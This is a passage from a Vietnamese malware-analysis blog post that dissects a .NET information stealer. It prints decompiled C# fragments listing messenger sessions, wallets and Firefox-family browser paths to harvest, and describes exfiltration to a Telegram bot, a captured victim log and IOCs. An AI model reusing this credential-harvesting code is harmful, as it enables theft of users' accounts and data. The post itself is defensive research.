peqijotunogasafiraddata.peqijotunogasafiraddata.SkypeSessions = memoryStream.ToArray();</span><br><span class="line">      tukahelasiyasit.tukahelasiyasit.lun = <span class="literal">true</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>Ta cũng có thể thấy một số static attribute của một class nhằm lưu trữ dữ liệu thu thập từ nhiều ứng dụng và phần mềm khác nhau trên máy tính.</p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] SignalSessions &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] ICQSessions &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] ToxSessions &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] ElementSessions &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] SkypeSessions &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] TelegramSessions &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] WalletsB &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] ChromiumExtensions &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">byte</span>[] EdgeExtensions &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> StringBuilder OutLook &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125; = <span class="keyword">new</span> StringBuilder();</span><br></pre></td></tr></table></figure></div>

<p>Việc khai báo này cho thấy chương trình này có mục đích thu thập và lưu trữ một lượng lớn dữ liệu nhạy cảm từ nhiều nguồn khác nhau trên máy tính. Các dữ liệu này được lưu trữ tạm thời trong mem (các mảng byte và StringBuilder) để sau đó có thể được xử lý hoặc truyền đi một cách ẩn danh.</p>
<p>Với những hành vi trên, ta có thể hình dung được ra đây là một <code>Stealer</code> program điển hình.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware19.png"
                      alt="image"
                ></p>
<div class="code-container" data-rel="Csharp"><figure class="iseeu highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">class</span> <span class="title">vasucijaxajeyip</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">static</span> <span class="built_in">string</span> jocabukewas = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">public</span> <span class="keyword">static</span> SortedList&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt; GeckoBrowsersList &#123; <span class="keyword">get</span>; <span class="keyword">set</span>; &#125; = <span class="keyword">new</span> SortedList&lt;<span class="built_in">string</span>, <span class="built_in">string</span>&gt;()</span><br><span class="line">      &#123;</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;Mozilla\\Firefox&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Firefox&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;Mozilla\\SeaMonkey&quot;</span>,</span><br><span class="line">          <span class="string">&quot;SeaMonkey&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;PostboxApp&quot;</span>,</span><br><span class="line">          <span class="string">&quot;PostBox&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;Waterfox&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Waterfox&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;K-Meleon&quot;</span>,</span><br><span class="line">          <span class="string">&quot;K-Melon&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;Thunderbird&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Thunderbird&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;Comodo\\IceDragon&quot;</span>,</span><br><span class="line">          <span class="string">&quot;IceDragon&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;8pecxstudios\\Cyberfox&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Cyberfox&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;NETGATE Technologies\\BlackHaw&quot;</span>,</span><br><span class="line">          <span class="string">&quot;BlackHaw&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="string">&quot;Moonchild Productions\\Pale Moon&quot;</span>,</span><br><span class="line">          <span class="string">&quot;PaleMoon&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;;</span><br></pre></td></tr></table></figure></div>

<p>Khi phân tích động, ta có thể thấy có các connection đến IP <code>149.154.167.220</code>, đây là IP của server API telegram.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware13.png"
                      alt="image"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware14.png"
                      alt="image"
                ></p>
<p>Cụ thể hơn khi file được thực thi, quan sát bằng wirehshark ta có thể thấy nó gửi POST request đến api server của telegram với token bot.</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware15.png"
                      alt="image"
                ></p>
<p>Check status thì thấy con bot này vẫn sống :)</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware16.png"
                      alt="image"
                ></p>
<p>Thử infiltrate con bot xem có thông tin hay ho gì không.</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">Test | Client Name: #MCP HAYUELOS</span><br><span class="line">Passwords: 22</span><br><span class="line">CreditCards: 0</span><br><span class="line">AutoFill: 207</span><br><span class="line">TopSites: 11</span><br><span class="line">Cookies: 0</span><br><span class="line">Bookmarks: 0</span><br><span class="line">Downloads: 66</span><br><span class="line">Vpn: 0</span><br><span class="line">Pidgin: 0</span><br><span class="line">Wallets: 0</span><br><span class="line">SavedWifiNetworks: 0</span><br><span class="line">BrowserWallets: 0</span><br><span class="line">FtpHosts: 0</span><br><span class="line">Element: False</span><br><span class="line">Signal: False</span><br><span class="line">Tox: False</span><br><span class="line">ICQ: False</span><br><span class="line">Skype: False</span><br><span class="line">Discord: False</span><br><span class="line">Telegram: False</span><br><span class="line">Outlook: False</span><br><span class="line">Steam: False</span><br><span class="line">Uplay: False</span><br><span class="line">BattleNet: False</span><br><span class="line">ProductKey: True</span><br><span class="line">DesktopScreenshot: False</span><br><span class="line">WebcamScreenshot: False</span><br></pre></td></tr></table></figure></div>

<p>Một trong các message là log chứa các thông tin mà stealer lấy được.</p>
<h3 id="Process-Tree"><a href="#Process-Tree" class="headerlink" title="Process Tree"></a>Process Tree</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware17.png"
                      alt="image"
                ></p>
<h3 id="Mitre-Attack"><a href="#Mitre-Attack" class="headerlink" title="Mitre Attack"></a>Mitre Attack</h3><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/malware1/malware18.png"
                      alt="image"
                ></p>
<h3 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h3><table>
<thead>
<tr>
<th>No</th>
<th>Indicator (SHA-256)</th>
<th>Type</th>
<th>Remarks</th>
</tr>
</thead>
<tbody><tr>
<td>1</td>
<td>944c7070cb77d937c9bae8c30a367b1c15b2f8951329cdb64d4b02a5e145ea44</td>
<td>SHA256</td>
<td>JS File</td>
</tr>
<tr>
<td>2</td>
<td><a href="http://jilas[.]net/files/222.txt">http://jilas[.]net/files/222.txt</a></td>
<td>URL</td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>3af1eea1320c617f8607630704e19422a743eac1b6fb5e941ccb3e88f320610b</td>
<td>URL</td>
<td>EXE File</td>
</tr>
</tbody></table>

		</div>

		
		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
			<div class="article-copyright-info-container">
    <ul>
        <li><strong>Title:</strong> Malware Analysis Real Case - Stealer with Malicious Javascript Obfuscate Technique</li>
        <li><strong>Author:</strong> TMQ</li>
        <li><strong>Created at
                :</strong> 2025-03-24 00:02:03</li>
        
            <li>
                <strong>Updated at
                    :</strong> 2025-03-24 00:24:49
            </li>
        
        <li>
            <strong>Link:</strong> https://tmqisme.github.io/2025/03/24/Malware-Analysis-Real-Case-1-Stealer-with-Malicious-Javascript-Obfuscate-Technique/
        </li>
        <li>
            <strong>
                License:
            </strong>
            

            
                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
            
        </li>
    </ul>
</div>

		</div>
		

		
		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
			
			<li class="tag-item mx-0.5">
				<a href="/tags/Malware-Analysis/">#Malware Analysis</a>&nbsp;
			</li>
			
		</ul>
		

		

		
		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
			
			
			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
				<a class="next" rel="next" href="/2025/03/21/Wannagame-Champsionship-2024-CTF-Writeup/">
					<span class="title flex justify-center items-center">
						<span class="post-nav-title-item">WANNAGAME CHAMPIONSHIP 2024</span>
						<span class="post-nav-item">Next posts</span>
					</span>
					<span class="right arrow-icon flex justify-center items-center">
						<i class="fa-solid fa-chevron-right"></i>
					</span>
				</a>
			</div>
			
		</div>
		


		
	</div>

	
	<div class="toc-content-container">
		<div class="post-toc-wrap">
	<div class="post-toc">
		<div class="toc-title">On this page</div>
		<div class="page-title">Malware Analysis Real Case - Stealer with Malicious Javascript Obfuscate Technique</div>
		<ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Attack-Chain"><span class="nav-text">Attack Chain:</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Analyze"><span class="nav-text">Analyze</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-1-1"><span class="nav-text">Phase 1.1:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-1-2"><span class="nav-text">Phase 1.2:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Phase-1-3"><span class="nav-text">Phase 1.3:</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse-1-1"><span class="nav-text">Reverse 1.1</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reverse-1-2"><span class="nav-text">Reverse 1.2</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Process-Tree"><span class="nav-text">Process Tree</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Mitre-Attack"><span class="nav-text">Mitre Attack</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#IOCs"><span class="nav-text">IOCs</span></a></li></ol>

	</div>
</div>
	</div>
	
</div>
			</div>

			
		</div>

		<div class="main-content-footer">
			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2022</span>
              -
            
            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">TMQ</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        2 posts in total
                    </span>
                    
                </p>
            
        </div>
        
            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
                
                    <span id="busuanzi_container_site_uv" class="lg:!block">
                        <span class="text-sm">VISITOR COUNT</span>
                        <span id="busuanzi_value_site_uv"></span>
                    </span>
                
                
                    <span id="busuanzi_container_site_pv" class="lg:!block">
                        <span class="text-sm">TOTAL PAGE VIEWS</span>
                        <span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.2</a></span>
        </div>
        
        
        
        
        
    </div>  
</footer>
		</div>
	</div>

	
	<div class="post-tools">
		<div class="post-tools-container">
	<ul class="article-tools-list">
		<!-- TOC aside toggle -->
		
		<li class="right-bottom-tools page-aside-toggle">
			<i class="fa-regular fa-outdent"></i>
		</li>
		

		<!-- go comment -->
		
	</ul>
</div>
	</div>
	

	<div class="right-side-tools-container">
		<div class="side-tools-container">
	<ul class="hidden-tools-list">
		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-plus"></i>
		</li>

		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
			<i class="fa-regular fa-magnifying-glass-minus"></i>
		</li>

		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
			<i class="fa-regular fa-moon"></i>
		</li>

		<!-- rss -->
		

		

		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
			<i class="fa-regular fa-arrow-down"></i>
		</li>
	</ul>

	<ul class="visible-tools-list">
		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
			<i class="fa-regular fa-cog fa-spin"></i>
		</li>
		
		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
			<i class="arrow-up fas fa-arrow-up"></i>
			<span class="percent"></span>
		</li>
		
		
	</ul>
</div>
	</div>

	<div class="image-viewer-container">
	<img src="">
</div>

	

</main>


<script  src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/libs/Swup.min.js" ></script><script  src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/libs/SwupSlideTheme.min.js" ></script><script  src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/libs/SwupScriptsPlugin.min.js" ></script><script  src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/libs/SwupProgressPlugin.min.js" ></script><script  src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/libs/SwupScrollPlugin.min.js" ></script><script  src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/libs/SwupPreloadPlugin.min.js" ></script>
<script>
    const swup = new Swup({
        plugins: [
            new SwupScriptsPlugin({
                optin: true,
            }),
            new SwupProgressPlugin(),
            new SwupScrollPlugin({
                offset: 80,
            }),
            new SwupSlideTheme({
                mainElement: ".main-content-body",
            }),
            new SwupPreloadPlugin(),
        ],
        containers: ["#swup"],
    });
</script>




	<script type="module" src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/tools/imageViewer.js" ></script><script type="module" src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/utils.js" ></script><script type="module" src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/main.js" ></script><script type="module" src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/layouts/navbarShrink.js" ></script><script type="module" src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/tools/scrollTopBottom.js" ></script><script type="module" src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/tools/lightDarkSwitch.js" ></script><script type="module" src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/layouts/categoryList.js" ></script>




    <script type="module" src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/tools/codeBlock.js" ></script>



    <script type="module" src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/layouts/lazyload.js" ></script>





  <script  src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/libs/Typed.min.js" ></script>
  <script type="module" src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/plugins/typed.js" ></script>







    <script  src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/libs/anime.min.js" ></script>




    <script type="module" src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/tools/tocToggle.js" data-swup-reload-script></script><script type="module" src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/layouts/toc.js" data-swup-reload-script></script><script type="module" src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/plugins/tabs.js" data-swup-reload-script></script>


<script  src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/libs/moment-with-locales.min.js" data-swup-reload-script></script>
<script type="module" src="https://unpkg.com/hexo-theme-redefine@2.8.2/source/js/build/layouts/essays.js" data-swup-reload-script></script>




	
</body>

</html>